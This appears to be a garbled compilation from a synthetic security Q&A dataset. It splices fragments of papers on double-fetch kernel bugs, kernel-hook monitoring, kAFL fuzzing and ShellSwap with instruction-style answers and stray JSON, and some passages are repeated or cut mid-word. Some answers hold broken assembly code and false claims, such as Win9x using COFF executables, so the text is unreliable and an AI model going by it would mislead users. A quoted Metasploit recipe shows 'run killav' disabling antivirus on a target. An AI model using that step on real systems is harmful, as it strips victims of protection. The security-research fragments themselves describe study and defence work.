Background   a) Malware and System Calls  Modern operating systems have a separation between  u ser-mode code and kernel-mode code. This separation is key  to the enforcement of security protocols, user space  separation, preventing race conditions between different  processes or services, and more. Kernel-mode code has more  privileges than user-mode code, including direct access to  physical hardware, control of RAM allocations, read/write  access to the hard drive, etc.  The basic functionality of any operating system is executed in  kernel-mode as well as hardware device drivers (e.g., network  interface cards, hard drives, audio). The user mode is allocated  to the higher-level functions of the operating system and most  applications installed by the user [8]. When a user-mode  process requires some kernel-mode functions, a switch in  operating mode must occur within the CPU. This switchthe Dom0 VM, and then reconstruct the se- mantic from these pages. In specific, the VMI  first finds the head of the module list whose virtual address can be pre-determined in the  system.map file. Next, it traverses this module  list to locate the module descriptor according to the module name. Finally, the VMI grabs  the descriptor\u2019s two fields: module_core and  core_text_size, by which we can calculate the code region of the target kernel module [4].  After setting the different access permis- sions, we divide the kernel address space into two separate address space, which is shown in  Figure 3. In the kernel module space, the ker- nel module cannot access the kernel code and kernel data; while in th e kernel space, the OS  kernel is not allowed to access the code and data regions of the kernel module. In this way, each interaction between the kernel module  and OS kernel will trigger a page fault due to  the memory protection. Then, we can make use of the hypervisor to analyse this event and  collect the information related to the kernel  hooks. For the execution control transfer from the OS kernel to kernel module (e.g. the OS  kernel invoke the kernel function inside the  kernel module), we log the page fault address where the target hook reside. In addition, we  need to get the source address of the indirect  control transfer instruction for later replace-ment such that the indirect control transfer  target could be verified securely. To this end,  we utilise the hardware debug feature [5] called       Fig.3  Memory protections in the kernel and kernel  module address space     Last Branch Recording (LBR). This feature  enables the processor to record the sources  and targets of recent branches in some specific  processor registers. By reading these registers,  we can obtain the execution transfer source.

Finally, drivers of- ten have to copy messages of variable type or variable length from the user space to the hardware, and, as we will see later, this often leads to double-fetch situations that cause vulnerabilities. In Linux, all devices have a \ufb01le representation which can be accessed from user space to interact with the hard- ware\u2019s driver. The kernel creates a \ufb01le in the /dev di- rectory for each driver, with which user space processes can interact using \ufb01le input /output system calls. The driver provides implementations of all \ufb01le related op- erations, including read() andwrite() functions. In such functions, the driver needs to fetch the data from 2https: //support.microsoft.com /en-us /kb/191840 preparedataclonesyscallmaliciousupdate1st fetch(check)2nd fetch(real use)entryKernel SpaceUser Spaceuser datatimeFigure 1: Principal Double Fetch Race Condition the user space (in write ) or copy data to the user space (inread ). The driver uses the transfer functions to do so, and again, any double fetch will involve multiple invoca- tions of transfer functions. 2.3 Double Fetch A double fetch is a special case of a race condition that occurs in memory access between the kernel and user space. The \ufb01rst vulnerability of this type was pre- sented by Serna [32] in a report on Windows double- fetch vulnerabilities. Technically, a double fetch takes place within a kernel function, such as a syscall, which is invoked by a user application from user mode. As il- lustrated in Figure 1, the kernel function fetches a value twice from the same memory location in the user space, the \ufb01rst time to check and verify it and the second time to use it (note that the events are on a timeline from left to right, but the user data is the same object all the time). Meanwhile, within the time window between the two kernel fetches, a concurrently running user thread modi-outperformed a model based on the long short-term memory  (LSTM) architecture [7] for the task of malware classification.

Background   a) Malware and System Calls  Modern operating systems have a separation between  u ser-mode code and kernel-mode code. This separation is key  to the enforcement of security protocols, user space  separation, preventing race conditions between different  processes or services, and more. Kernel-mode code has more  privileges than user-mode code, including direct access to  physical hardware, control of RAM allocations, read/write  access to the hard drive, etc.  The basic functionality of any operating system is executed in  kernel-mode as well as hardware device drivers (e.g., network  interface cards, hard drives, audio). The user mode is allocated  to the higher-level functions of the operating system and most  applications installed by the user [8]. When a user-mode  process requires some kernel-mode functions, a switch in  operating mode must occur within the CPU. This switchthe Dom0 VM, and then reconstruct the se- mantic from these pages. In specific, the VMI  first finds the head of the module list whose virtual address can be pre-determined in the  system.map file. Next, it traverses this module  list to locate the module descriptor according to the module name. Finally, the VMI grabs  the descriptor\u2019s two fields: module_core and  core_text_size, by which we can calculate the code region of the target kernel module [4].  After setting the different access permis- sions, we divide the kernel address space into two separate address space, which is shown in  Figure 3. In the kernel module space, the ker- nel module cannot access the kernel code and kernel data; while in th e kernel space, the OS  kernel is not allowed to access the code and data regions of the kernel module. In this way, each interaction between the kernel module  and OS kernel will trigger a page fault due to  the memory protection. Then, we can make use of the hypervisor to analyse this event and  collect the information related to the kernel  hooks. For the execution control transfer from the OS kernel to kernel module (e.g. the OS  kernel invoke the kernel function inside the  kernel module), we log the page fault address where the target hook reside. In addition, we  need to get the source address of the indirect  control transfer instruction for later replace-ment such that the indirect control transfer  target could be verified securely. To this end,  we utilise the hardware debug feature [5] called       Fig.3  Memory protections in the kernel and kernel  module address space     Last Branch Recording (LBR). This feature  enables the processor to record the sources  and targets of recent branches in some specific  processor registers. By reading these registers,  we can obtain the execution transfer source.  On the other hand, for the execution trans- fer from the kernel module to OS kernel, we record the page fault ad dress where the kernelof source code, in order toexamine internal variable states and to step through program execution oneline at a time. (We\u2019ll discuss breakpoints in more depth later in this chapter.)Assembly-level debuggers, sometimes called low-level debuggers, operate onassembly code instead of source code.\"                   Question: 'What is the difference between Assembly-Level Debuggers and User-Mode Debugging?'[/INST] Assembly-level debuggers and user-mode debugging serve different purposes in the context of software development and debugging.\n\nAssembly-level debuggers, also known as low-level debuggers, operate directly on assembly code instead of working with high-level source code. They provide fine-grained control over the execution of a program, allowing developers to inspect and modify the machine code instructions, registers, and memory locations in real-time. This level of detail is essential when dealing with complex issues like buffer overflows, memory corruption, or low-level system bugs.\n\nOn the other hand, user-mode debugging refers to debugging applications while they run in their intended user environment. It does not require deep knowledge of assembly language or the underlying system architecture. Instead, user-mode debuggers work with source code and offer features like stepping through code line by line, setting breakpoints, examining variables, and inspecting call stacks. These tools are widely used for debugging applications written in various programming languages, including C++, Java, Python, and others.\n\nIn summary, assembly-level debuggers focus on the low-level details of machine code execution, while user-mode debuggers cater to the needs of developers working primarily with source code and high-level programming concepts. Both types of debuggers play crucial roles in software development and debugging, depending on the nature and complexity of the issue at hand."}

Question: 'What is the difference between Source-Level and Assembly-Level Debuggers?'[/INST] Source-level debuggers allow developers to debug their code using high-level programming constructs and syntax, making it easier to understand the flow of the program. They display the source code of the program being debugged alongside the execution context, allowing for direct manipulation of variables and easier navigation through the code.\n\nOn the other hand, assembly-level debuggers operate at the lowest level of programming, working directly with machine code instructions. They are useful for understanding and debugging low-level issues, such as memory corruption or buffer overflow vulnerabilities, that may not be apparent when using a source-level debugger. However, working with assembly-level debuggers requires a deep understanding of the underlying hardware and instruction set architecture.\n\nIn summary, source-level debuggers offer a more user-friendly experience for developers, while assembly-level debuggers provide greater control and insight into the inner workings of a program. The choice between the two depends on the specific requirements of the debugging task."}

The kernel is the core part of an operating system that manages hardware resources, memory management, process scheduling, and other critical functions. In kernel-mode debugging, the debugger has direct access to the kernel data structures and can inspect and modify them in real-time. This level of access allows for more comprehensive analysis and troubleshooting of complex issues, but it also requires a higher level of expertise and carries a greater risk of causing system instability or crashes.\n\nUser-mode debugging, on the other hand, refers to the process of debugging code that is running in user space, outside of the kernel. User-mode debuggers operate at the application level and do not have direct access to kernel data structures. Instead, they use various debugging techniques such as breakpoints, stepping through code, and examining memory dumps to diagnose and resolve issues within user applications. User-mode debugging is generally less intrusive than kernel-mode debugging and carries a lower risk of causing system instability or crashes.\n\nIn the context of the provided information, rootkits are malicious software that operate at the kernel level and hide their presence from user-mode tools and processes. Rootkits use various stealth techniques to evade detection, including modifying kernel data structures and hooking system calls. To detect and remove rootkits, advanced techniques such as kernel-mode debugging and memory forensics are often required. However, even with these techniques, rootkit detection and removal can be challenging due to the complexity and sophistication of modern rootkits.\n\nTherefore, the differences between kernel-mode and user-mode debugging are significant when it comes to rootkit detection and removal. While user-mode tools may be able to identify some signs of a rootkit's presence, they may not be able to fully detect or remove the rootkit without kernel-mode access. Conversely, kernel-mode debugging provides the necessary access to detect and remove rootkits, but it also requires a high level of expertise and carries a greater risk of causing system instability or crashes."}

This is because lower-level APIs provide more control over the network packets, leading to more hard-coded data being used in the malware. Hard-coded data refers to static information that is embedded directly into the malware's code. The presence of more hard-coded data increases the chances that the malware author may have made an error, which can be exploited to generate signatures. On the other hand, malware that uses ephemeral data generates dynamic network traffic, making it more difficult to detect using traditional signature-based methods."}

As the pointer does not directly depend on pro- gram input, we missed this memory corruption.

Besides, as can be seen from Rule 5 in Figure 9, when there are two fetches in a loop, the second fetch of the last iteration and the \ufb01rst fetch of the next iteration will be matched as a double fetch. This case should be removed as false positive because the user pointer should have been changed when crossing the iter- ations and these two fetches are getting di \ufb00erent values. Moreover, cases that use an array to copy di \ufb00erent values inside a loop also cause false positives. 4 Evaluation In this section, we present the evaluation of our study, which includes two parts: the statistics of the manual analysis, and the results of the re\ufb01ned approach when applied to three open source kernels: Linux, Android, and FreeBSD. We obtained the most up-to-date versions available at the time of the analysis. 4.1 Statistics and Analysis In Linux 4.5, there are 52,881 \ufb01les in total and 39,906 of them are source \ufb01les (with a \ufb01le extension of .c or .h), which are our analysis targets (other \ufb01les are ignored). 17,532 source \ufb01les belong to drivers (44%). After the basic pattern matching of the source \ufb01les and the man- ual inspection to remove false positives, we obtained 90 double-fetch candidate \ufb01les for further inspection. We categorized the candidates into the three double-fetch scenarios Size Checking ,Type Selection and Shallow Copy . They are the most common cases on how a double fetch occurs while user space data is copied to the kernel space and how the data is then used in the kernel. We have discussed these scenarios in detail with real double- fetch bug examples in the previous section. As shown in Table 1, of the 90 candidates we found, 30 were re- lated to the size checking scenario, 11 were related to the type selection scenario, and 31 were related to the shal- low copy scenario, accounting for 33%, 12%, and 34%Moreover, the branch must use at least one symbolic variablefrom sink AST and its call site have to be in current call stack,i.e. function containing this branch should be in current callstack. Furthermore, we can detect signedness if symbolic value is obtained with strto *lfunctions. For instance, strtol is used for signed value and strtoul for unsigned value. Finally, when we get information about the signedness (or do not), we check whether security predicates are satis\ufb01able. Ifwe know the signedness, we check only one speci\ufb01c securitypredicate for this signedness. We slice all relevant constraintsfrom the path predicate at sink point and conjunct them withthe security predicate. We report signed or unsigned integerover\ufb02ow and generate corresponding input when the resultingpredicate is satis\ufb01able. If we couldn\u2019t retrieve the signedness, then we query whether the integer over\ufb02ow of both kinds may happen atthe same time. In other words, may some single input cause unsigned and signed integer over\ufb02ow errors simultaneously.whether the integer over\ufb02ow of both kinds may happen atthe same time.

If both security predicates are separately true, we print two warnings and save two inputs for each ofthem.

Some of the key elements that can make a difference include:\n\n* Specificity of the pattern: A signature that matches a very specific pattern is less likely to result in false positives.\n* Uniqueness of the pattern: Signatures that target unique patterns or combinations of patterns are less likely to produce false positives.\n* Contextual information: Considering contextual information, such as the source IP address, user agent string, and HTTP headers, can help improve the accuracy of a signature.\n* Use of regular expressions: Using regular expressions in signatures can help capture complex patterns and reduce false positives.\n* Use of wildcards and ranges: Using wildcards and ranges in signatures can increase the likelihood of false positives, so they should be used judiciously.\n* Use of security predicates: Including security predicates in signatures can help ensure that only legitimate traffic matches the signature and reduce false positives.\n\nOverall, creating a successful signature requires a balance between specificity, uniqueness, and contextual information to minimize false positives while still effectively detecting the intended threat."}
{"query": "The key difference between flow-oriented and linear disassembly is what?'", "Context": "For example,the standard local call instruction is 5 bytes, beginning with the opcode 0xE8.If the 16 bytes of data that compose the switch table end with the value 0xE8,the disassembler would encounter the call instruction opcode and treat thenext 4 bytes as an operand to that instruction, instead of the beginning ofthe next function.Linear-disassembly algorithms are the easiest to defeat because they areunable to distinguish between code and data.Flow-Oriented DisassemblyA more advanced category of disassembly algorithms is the flow-oriented dis-assembler. This is the method used by most commercial disassemblers such asIDA Pro.The key difference between flow-oriented and linear disassembly is thatthe disassembler doesn\u2019t blindly iterate over a buffer, assuming the data isx0cnothing but instructions packed neatly together. Instead, it examines eachinstruction and builds a list of locations to disassemble.The following fragment shows code that can be disassembled correctlyonly with aAny disassembler must make certain assumptions inorder to present the code it is disassembling clearly. When these assumptionsfail, the malware author has an opportunity to fool the malware analyst.There are two types of disassembler algorithms: linear and flow-oriented.Linear disassembly is easier to implement, but it\u2019s also more error-prone.Linear DisassemblyThe linear-disassembly strategy iterates over a block of code, disassemblingone instruction at a time linearly, without deviating. This basic strategy isemployed by disassembler writing tutorials and is widely used by debuggers.x0cLinear disassembly uses the size of the disassembled instruction to determinewhich byte to disassemble next, without regard for flow-control instructions.The following code fragment shows the use of the disassembly librarylibdisasm (http://sf.net/projects/bastard/files/libdisasm/) to implement a crudedisassembler in a handful of lines of C using linear disassembly:char buffer[BUF_SIZE];int position =confused with a jump instruction. This time, about halfof the occurrences of MOVWF PCL was recognized as a GOTO instruction. MOVWF PCL is used for every table look-up in SubBytes and the key scheduling and was hence executed several times per round. VII. Conclusion and Future Work We presented a side-channel based disassembler using localized EM emanations. With our approach, we reacheda recognition rate of 96.24 % on the test set and 87.69 % onreal code (an implementation of the AES) for a Microchip PIC16F687 \u03bcC. Our novel approach signi\ufb01cantly improves the previously reported recognition rates of 70.1 % (testset) and 40.7 % (real code), without using any furtherassumptions for statistical post-processing (e.g., usingMarkov chains as done in [5]). So far, the measurements foreach position on the IC were recorded sequentially, i.e., we assume that the program \ufb02ow (after a reset) is the samegiven constant input data. However, there are certainlysituations were this assumption does not hold. In this case, each measurement position would result in a di\ufb00erent trace (with a di\ufb00erent sequence of instructions). In the future,we hence plan to place several EM probes on the target \u03bcC simultaneously, e.g., using small hand-wound coils orantennas printed on a circuit board.A di\ufb00erent aspect for future research is the extension of the presented methods to also recognize the operandsof the instructions. Apart from building templates for thiscase\u2014which would highly increase the e\ufb00orts for creatingand processing the pro\ufb01ling traces\u2014classical techniqueslike Di\ufb00erential Power Analysis (DPA) may be used incases where either the inputs or the outputs of the \u03bcC are known.

Contextual Information:                   For example,the standard local call instruction is 5 bytes, beginning with the opcode 0xE8.If the 16 bytes of data that compose the switch table end with the value 0xE8,the disassembler would encounter the call instruction opcode and treat thenext 4 bytes as an operand to that instruction, instead of the beginning ofthe next function.Linear-disassembly algorithms are the easiest to defeat because they areunable to distinguish between code and data.Flow-Oriented DisassemblyA more advanced category of disassembly algorithms is the flow-oriented dis-assembler. This is the method used by most commercial disassemblers such asIDA Pro.The key difference between flow-oriented and linear disassembly is thatthe disassembler doesn\u2019t blindly iterate over a buffer, assuming the data isx0cnothing but instructions packed neatly together. Instead, it examines eachinstruction and builds a list of locations to disassemble.The following fragment shows code that can be disassembled correctlyonly with aAny disassembler must make certain assumptions inorder to present the code it is disassembling clearly. When these assumptionsfail, the malware author has an opportunity to fool the malware analyst.There are two types of disassembler algorithms: linear and flow-oriented.Linear disassembly is easier to implement, but it\u2019s also more error-prone.Linear DisassemblyThe linear-disassembly strategy iterates over a block of code, disassemblingone instruction at a time linearly, without deviating. This basic strategy isemployed by disassembler writing tutorials and is widely used by debuggers.x0cLinear disassembly uses the size of the disassembled instruction to determinewhich byte to disassemble next, without regard for flow-control instructions.The following code fragment shows the use of the disassembly librarylibdisasm (http://sf.net/projects/bastard/files/libdisasm/) to implement a crudedisassembler in a handful of lines of C using linear disassembly:char buffer[BUF_SIZE];int position =confused with a jump instruction. This time, about halfof the occurrences of MOVWF PCL was recognized as a GOTO instruction. MOVWF PCL is used for every table look-up in SubBytes and the key scheduling and was hence executed several times per round. VII. Conclusion and Future Work We presented a side-channel based disassembler using localized EM emanations. With our approach, we reacheda recognition rate of 96.24 % on the test set and 87.69 % onreal code (an implementation of the AES) for a Microchip PIC16F687 \u03bcC. Our novel approach signi\ufb01cantly improves the previously reported recognition rates of 70.1 % (testset) and 40.7 % (real code), without using any furtherassumptions for statistical post-processing (e.g., usingMarkov chains as done in [5]). So far, the measurements foreach position on the IC were recorded sequentially, i.e., we assume that the program \ufb02ow (after a reset) is the samegiven constant input data. However, there are certainlysituations were this assumption does not hold. In this case, each measurement position would result in a di\ufb00erent trace (with a di\ufb00erent sequence of instructions). In the future,we hence plan to place several EM probes on the target \u03bcC simultaneously, e.g., using small hand-wound coils orantennas printed on a circuit board.A di\ufb00erent aspect for future research is the extension of the presented methods to also recognize the operandsof the instructions. Apart from building templates for thiscase\u2014which would highly increase the e\ufb00orts for creatingand processing the pro\ufb01ling traces\u2014classical techniqueslike Di\ufb00erential Power Analysis (DPA) may be used incases where either the inputs or the outputs of the \u03bcC are known.

Linear disassembly iterates through a block of code, disassembling one instruction at a time linearly without deviating. It assumes that the next byte to be disassembled is the start of the next instruction. Flow-oriented disassembly, on the other hand, examines each instruction and builds a list of locations to disassemble based on the control flow of the program. It takes into account flow-control instructions like jumps and branches, which can affect the order in which instructions should be disassembled. As a result, flow-oriented disassemblers are generally more accurate than linear disassemblers, especially when dealing with complex code structures."}

The main differences between them are:\n\n1. Security: Win9x does not have a secure multiuser login to the console, allowing anyone to reboot or power on the system without a password. In contrast, WinNT has a more robust security model that includes secure multiuser logon and the ability to control which user profiles are active.\n2. Remote Access: Win9x does not have built-in remote logon facilities, making it relatively inert from a network-based attacker's perspective. WinNT, on the other hand, supports remote access through various means, including Terminal Services and Remote Desktop.\n3. File Format: Win9x uses the older Common Object File Format (COFF) for its executable files, while WinNT uses the Portable Executable (PE) file format.\n4. Event Logging: WinNT maintains event logs that can be used to track system activity, while Win9x does not have an innate capability to record or detect any kind of attack signature.\n5. Memory Management: In Win9x, the most significant bit of the Program Environment Block (PEB) pointer is often set to indicate that the system is a Win9x system. WinNT systems typically do not set the most significant bit of the PEB pointer.\n\nThese differences make Win9x less secure and less capable than WinNT systems, but they also make Win9x easier to hack due to its lack of security features."}

Question: 'What is an important difference between x64 and x86 in relation to PIC and shellcode?'[/INST] In the context of Position Independent Code (PIC) and shellcode, an important difference between x86 and x64 architectures lies in their addressing modes.\n\nIn x86 assembly, when you need to access data at a location that is not an offset from a register, you must use absolute addressing, which means storing the entire address in the instruction. However, in x64 assembly, you can access data at a location that is an offset from the current instruction pointer (RIP). This feature is referred to as RIP-relative addressing.\n\nThe significance of this difference for PIC and shellcode is that in x64, the use of RIP-relative addressing makes it easier to create position-independent code since the addresses are relative to the current instruction pointer rather than absolute addresses. This is particularly useful in shellcode, where the code may be loaded at different memory locations depending on the target system's architecture.\n\nFurthermore, the larger 64-bit addressing space in x64 also allows for more efficient handling of large data structures and larger memory spaces, making it a preferred choice for modern systems with larger memory requirements.\n\nHere's a simple example of a C program in Listing 21-1 that accesses a memory address using both x86 and x64 architectures:\n\nx86 Assembly (32-bit):\n```assembly\nsection .data\nx db 0x12345678 ; initialize data with an arbitrary value\n\nsection .text\nglobal _start\n_start:\nmov eax, 0x1B ; sys_read\nmov ebx, 0x0 ; stdout\nmov ecx, esp ; read from the stack\nadd ecx, 0x10 ; offset to the data\nmov edx, 4 ; number of bytes to read\nint 0x80 ; call syscall\n\n; Access the data at memory location x:\nmov eax, [x] ; load the value at memory location x into EAX\n```\n\nx64 Assembly (64-bit):\n```assembly\nsection .data\nx dq 0x123456789ABCDEF ; initialize data with an arbitrary value\n\nsection .text\nglobal _start\n_start:\nmov rax, 0x3F ; sys_read\nmov rdi, 1 ; stdout\nmov rsi, rsp ; read from the stack\nlea rdx, [rsp+0x10] ; offset to the data\nmov rax, qword [rsp] ; save the current RIP value\nmov qword [rsp], _start ; update RIP with the new starting address\nsyscall\n\n; Access the data at memory location x:\nmov rax, qword [x] ; load the value at memory location x into RAX\nmov rax, rax ; copy the value to RAX for further processing\n```\n\nAs shown above, in x64, we can use the LEA (Load Effective Address) instruction to perform RIP-relative addressing, making the code more compact and position-independent."}

Suppose Alice\u2019s                   Question: 'What is the difference between an integer overflow and a heap-based buffer overflow?'[/INST] An integer overflow occurs when an integer value exceeds its maximum representable limit in memory, resulting in incorrect or unexpected values. This issue is not directly related to memory management or buffer overflows. Instead, it arises from the limitations of the data type itself.\n\nOn the other hand, a heap-based buffer overflow is a type of memory vulnerability where more data is written to a dynamically allocated memory block than what was initially allocated. In the context provided, the server thread allocates a 64KB buffer to read the client's handshake packet. If the client sends a larger packet than expected, the data may overflow into adjacent memory locations, potentially leading to arbitrary code execution or memory corruption.\n\nThe key differences between these two types of vulnerabilities are their causes and potential consequences. Integer overflows result from data type limitations, while heap-based buffer overflows stem from improper memory management. Heap-based buffer overflows can lead to more severe consequences, such as code injection or memory corruption, compared to integer overflows, which typically result in incorrect calculations or unexpected behavior."}

There were 22,048 unique disclosed CVE vulnerabilities that had a proof of concept exploit developed.

This allows us to remain independent of the target OS as we just re- quire a small user space component that interacts with the targeted OS. As a result, our approach introduces almost no performance overhead, even in cases where the OS crashes, and performs up to 17,000 executions per second on an off-the-shelf laptop. We developed a framework called kernel-AFL (kAFL) to assess the secu- rity of Linux, macOS, and Windows kernel components. Among many crashes, we uncovered several \ufb02aws in the ext4 driver for Linux, the HFS andAPFS \ufb01le system of macOS, and the NTFS driver of Windows. 1 Introduction Several vulnerability classes such as memory corrup- tions, race-conditional memory accesses, and use-after-free vulnerabilities, are known threats for programs run- ning in user mode as well as for the operating system (OS) core itself. Past experience has shown that attack- ers typically focus on user mode applications. This is likely because vulnerabilities in user mode programs are notoriously easier and more reliable to exploit. How- ever, with the appearance of different kinds of exploit defense mechanisms \u2013 especially in user mode, it has become much harder nowadays to exploit known vul- nerabilities. Due to those advanced defense mechanisms in user mode, the kernel has become even more appeal- ing to an attacker since most kernel defense mechanisms are not widely deployed in practice. This is due to more complex implementations, which may affect the system performance. Furthermore, some of them are not part of the of\ufb01cial mainline code base or even require sup- port for the latest CPU extension (e.g., SMAP / SMEP on x86-64). Additionally, when compromising the OS, an attacker typically gains full access to the system re-These are known as\u201cclient-side\u201d exploits.Client-side exploits are also known as malicious server exploits becausethey require the Attacker to set up or compromise a server that the targetwill access.

Operating system-based exploits target vulnerabilities in the underlying operating system and require the attacker to have direct access to the victim's computer to exploit them. Client-side exploits, on the other hand, are executed in the context of a web browser or other client-side software, and do not require direct access to the victim's computer. Instead, the attacker must find a way to get the victim to visit a malicious website or download a malicious file that contains the exploit code. Once the code is executed in the victim's browser, it can potentially take control of the victim's computer or steal sensitive information.\n\nAnother key difference is that client-side exploits often rely on vulnerabilities in web technologies or software that are commonly used across different operating systems, whereas operating system-based exploits are specific to the underlying operating system. For example, a client-side exploit might target a vulnerability in JavaScript or Adobe Flash Player, which can be exploited regardless of the operating system being used. In contrast, an operating system-based exploit might target a vulnerability in a specific operating system component or driver.\n\nFinally, client-side exploits can be more difficult to detect and prevent than operating system-based exploits, because they don't require the attacker to have direct access to the victim's computer. Firewalls and antivirus software may not be effective against client-side exploits, as they cannot easily detect and block code that is being executed in the victim's browser. Instead, preventing client-side exploits often requires a combination of techniques, such as keeping software up-to-date, using content security policies to restrict the types of content that can be loaded in the browser, and educating users about safe browsing practices."}

In thenext few recipes, we will see how we can use ruby scripting to build our own modules andimport them into the framework.Getting readyTo start building our own module we will need basic knowledge of Ruby scripting. We havealready discussed the use and implementation of Ruby in meterpreter scripting. In this recipe,we will see how we can use Ruby to start building modules for the framework.

This will help us in quickly extending the framework according to our needs. In thenext few recipes, we will see how we can use ruby scripting to build our own modules andimport them into the framework.Getting readyTo start building our own module we will need basic knowledge of Ruby scripting. We havealready discussed the use and implementation of Ruby in meterpreter scripting. In this recipe,we will see how we can use Ruby to start building modules for the framework. The process isvery much similar to meterpreter scripting. The difference lies in using a set of pre-defined linesthat will be required in order to make the framework understand the requirements and natureof the module. So\"In our case, there are two processes responsible for antivirusprotection on the target system. They are egui.exe and eset.exe. Let us see howwe can use the Metasploit to kill these processes.How it works...Meterpreter provides a very useful script named killav.rb which can be used to kill theantivirus processes running on the target system and, thus, disable it. Let us try this scripton our Windows 7 target which is running ESET NOD32 antivirus.meterpreter > run killav[*] Killing Antivirus services on the target...The run command is used to execute Ruby scripts in meterpreter. Once the script hasexecuted, we can again check the running processes on the target in order to make surethat all the antivirus processes have been killed. If none of the antivirus processes arerunning, then it means that the antivirus has been temporarily disabled on the targetmachine and we can now move ahead with our penetration testing process.But what if the processes are still running? Lets find out the\"                   Question: 'What is the difference between Ruby and meterpreter scripting?'[/INST] Ruby is a programming language, while meterpreter scripting is a type of scripting that utilizes the Metasploit Framework's meterpreter payload to execute commands on a remote system. While both involve writing code in the Ruby language, meterpreter scripting is specifically designed for exploiting vulnerabilities and gaining access to systems, whereas Ruby can be used for a wide range of programming tasks. In the context of the provided text, the author discusses using Ruby for building custom meterpreter modules, which allows for extending the functionality of the meterpreter payload."}

Below I will list a few of the mostcommon programming languages used, and how a1  ## [ shellcode ]  # Shellcode category     In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called \"shellcode\" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. Shellcode is commonly written in machine code.      **Classification:**   There are several methods of classifying exploits. The most common is by how the exploit contacts the vulnerable software. A remote exploit works over a network and exploits the security vulnerability without any prior access to the vulnerable system. A local exploit requires prior access to the vulnerable system and usually increases the privileges of the person running the exploit past those granted by the system administrator. Exploits against client applications also exist, usually consisting of modified servers that send an exploit if accessed with a client application. Exploits against client applications may also require some interaction with the user and thus may be used in combination with the social engineering method. Another classification is by the action against the vulnerable system; unauthorized data access, arbitrary code execution, and denial of service are examples. Many exploits are designed to provide superuser-level access to a computer system. However, it is also possible to use several exploits, first to gain low-level access, then to escalate privileges repeatedly until one reaches root. Normally a single exploit can only take advantage of a specific software vulnerability. Often, when an exploit is published, the vulnerability is fixed through a patch and the exploit becomes obsolete until newer versions of the software become available Shellcodes any types.This chapter will discussthe exploits Vlad and his crew use in the \ufb01ctional story.An exploit (from the same word in the French language, meaning \u201cachievement\u201dor \u201caccomplishment\u201d) is a piece of software, a chunk of data, or sequence ofcommands that take advantage of a bug, glitch, or vulnerability to cause unintendedor unanticipated behavior to occur on computer software, hardware, or somethingelectronic (usually computerized or networked). This frequently includes suchthings as violently gaining control of a computer system or allowing a privilege esca-lation or denial of service attack.There are several methods of classifying exploits.The most common is by how theexploit contacts the vulnerable software.

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous.

This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found here.\"of remote exploits against a piece of software running on a victim computer, an attacker can install backdoors and ex\ufb01ltrate sensitive information without physical access to the compromised system, leading to real-world impacts on the \ufb01nances and reputation of the victim. However, developing a remote exploit is not easy. A comprehensive understanding of the vulnerability is a must, and complex techniques to bypass defenses on the remote system are necessary. When possible, rather than developing a new exploit from scratch, attackers prefer to reuse existing exploits in their attacks, making necessary changes to adapt these exploits to new environments. One such adaptation is the replacement of the original shellcode (i.e., the attacker- injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant . Shellcode transplanting has many applications, including reversing command and control protocols, understanding captured exploits, and replaying attacks. Thus, this capability is very helpful in situations rangingfrom rapid cyber-response (i.e., quick analysis of and response to 0-day attacks) and adversarial scenarios (like cyber-security Capture-The-Flag competitions or cyber warfare in the real world). Unfortunately, current techniques to transplant shellcode generally require an analyst to have a decent understanding of how the original exploit interacts with the program, what vulnerability it triggers, and how it bypasses deployed exploit mitigations. As a result, the analyst must put a lot of effort into development and debugging, which negates much of the advantage of shellcode transplanting. In investigating this problem, we identi\ufb01ed three main challenges to tackling the shellcode transplant problem . First,stands for shell code, and that N stands for a NOP instruction, the new stack would look  like this:  bottom of EEEEEEEEEEE EEEE FFFF FFFF FFFF FFFF top of  memory 123456783- CDEF 0123 4567 89- CDEF memory  buffer sfp ret a b C  <..... INNNNSSSSSSSI IOxE2I tOxE21 IOxE21 IOxE21 [OxE21  A I  I I  Figure 2: Structiue (horizontal representation) of a buffer overflow exploit.  For remote overflow exploits, the intruder can compile and analyze the service program  on his machine to get a rough idea of the correct address, the exact value of which  depends on the environment variables that the user has set. Hence, in order to increase the  chances ofpointing to the exploit code, a string of NOPs are placed, as in local exploits.  2.2. Polymorphic shellcode  Polymorphic shellcode [7] is basically a functionally equivalent form of a buffer  overflow exploit with a different signature on the network. As it hits the target machine,  it reassembles, having eluded the IDS [SI.  A well-known tool that generates polymorphic shellcode is a polymorphic  buffer-overflow engine called ADMutate [9]. An attacker feeds the ADMutate a buffer  overflow exploit to generate hundreds or thousands of functionally equivalent exploits  [IO]. This is accomplished by using simple encryption techniques, along with the  substitution of functionally equivalent machine-language instructions.

